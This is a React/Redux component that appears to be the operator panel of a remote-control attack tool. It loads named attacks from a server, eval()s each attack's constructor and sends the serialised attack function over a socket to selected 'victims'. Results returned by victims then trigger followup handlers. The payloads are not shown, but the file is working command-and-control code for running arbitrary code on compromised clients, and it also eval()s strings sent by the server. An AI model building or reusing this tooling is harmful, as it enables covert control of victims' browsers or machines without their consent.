import React, {Component, PropTypes} from 'react'
import {connect} from 'react-redux'
import {bindActionCreators} from 'redux'
import * as attackActions from '../../actions/attacks'
import * as utils from '../../utils'

class Attacks extends Component {
  componentDidMount() {
    this._socket = this.props.socket

    this._socket.on('attacks', this._attacksReceived)
    this._socket.on('result', this._resultReceived)
    
    this._socket.emit('getAttacks')
    this._followupBuffer = {}
  }

  _attacksReceived = (attacks)=>{
    console.log(attacks)
    this.props.actions.setAttacks(attacks)
  }

  _executeAttack = (attack)=>{
    let attackConstructor
    eval(`attackConstructor = ${attack.constructor}`)
    if(!this._isValidExecutionConstructor(attackConstructor)){
      this.props.logger(`Attack "${attack.name}" failed execution instruction validation.`)
      return
    }

    let activeTargetSocketIds = utils.objToArrayOfValues(this.props.activeTargets, 'socketId')
    if(activeTargetSocketIds.length === 0){
      this.props.logger(`No active targets. Select a target.`)
      return
    }

    let instructions = attackConstructor(utils.getObjValues(attack.inputs), this.props.logger)
    activeTargetSocketIds.forEach((socketId)=>{
      this.props.logger(`Executing attack "${attack.name}" on ${this.props.victimsBySocketIdMap[socketId].id}...`)
      let attackInstanceId = `${socketId}_${new Date().valueOf()}`
      this._followupBuffer[attackInstanceId] = instructions.followup.bind(null, instructions.inputs)
      this._socket.emit('attackUser', {
        userSocket: socketId,
        attack: instructions.attack.toString(),
        inputs: Object.assign({}, instructions.inputs, {id: attackInstanceId})
      })
    })
  }

  _isValidExecutionConstructor = (execute)=>{
    if(typeof execute !== 'function'){
      this.props.logger(`attack instructions are not a function`)
      return false
    }
    return true
  }

  _resultReceived = (result)=>{
    this.props.logger(`Result received from victim ${this.props.victimsBySocketIdMap[result.id.slice(0, result.id.lastIndexOf('_'))].id}`)
    this._followupBuffer[result.id]()
  }

  render(){
    return (
      <table className='ui accordion selectable large table'>
        <thead>
          <tr>
            <th colSpan='5'>
              <h3>Attacks</h3>
            </th>
          </tr>
          <tr>
            <th>Name</th>
            <th className='twelve wide'>Description</th>
          </tr>
        </thead>
        <tbody>
          {
            this.props.attacks.map((attack, idx) => (
              [
                <tr
                  key={`attack_${idx}`}
                  onClick={() => {this.props.actions.toggleActiveAttack(attack)}}
                  className={this.props.activeAttack.id === attack.id ? 'title active' : 'title'}
                >
                  <td>{attack.name}</td>
                  <td>{attack.description}</td>
                </tr>,
                Object.keys(attack.inputs).map((inputName, indx)=>(
                  <tr
                    key={`attack_${idx}_input_${indx}`}
                    className={this.props.activeAttack.id === attack.id ? 'content active' : 'content'}
                    //semantic ui forces this row into the first cell without this
                    style={{display: this.props.activeAttack.id === attack.id ? 'table-row' : 'none'}}
                  >
                    <td><label>{inputName}: </label><input onChange={(event)=>{this.props.actions.updateActiveAttackInput(inputName, event.target.value)}} defaultValue={attack.inputs[inputName].defaultValue}/></td>
                    <td><span>{attack.inputs[inputName].description}</span></td>
                  </tr>
                )),
                <tr
                  key={`attack_${idx}_execute`}
                  className={this.props.activeAttack.id === attack.id ? 'content active' : 'content'}
                  //semantic ui forces this row into the first cell without this
                  style={{display: this.props.activeAttack.id === attack.id ? 'table-row' : 'none'}}
                >
                  <td colSpan="2"><button onClick={()=>{this._executeAttack(attack)}}>Execute</button></td>
                </tr>
              ]
            ))
          }
        </tbody>
      </table>
    )
  }
}

Attacks.propTypes = {
  attacks: PropTypes.array,
  activeAttack: PropTypes.object,
  activeTargets: PropTypes.object,
  victimsBySocketIdMap: PropTypes.object,
  logger: PropTypes.func 
}

function mapStateToProps(state, props) {
  return {
    attacks: state.attacks.attacks,
    activeAttack: state.attacks.activeAttack,
    activeTargets: state.victims.activeTargets,
    victimsBySocketIdMap: state.victims.victimsBySocketIdMap,
    logger: state.terminal.logger
  }
}

function mapDispatchToProps(dispatch) {
  return {
    actions: bindActionCreators(attackActions, dispatch)
  }
}

export default connect(mapStateToProps, mapDispatchToProps)(Attacks)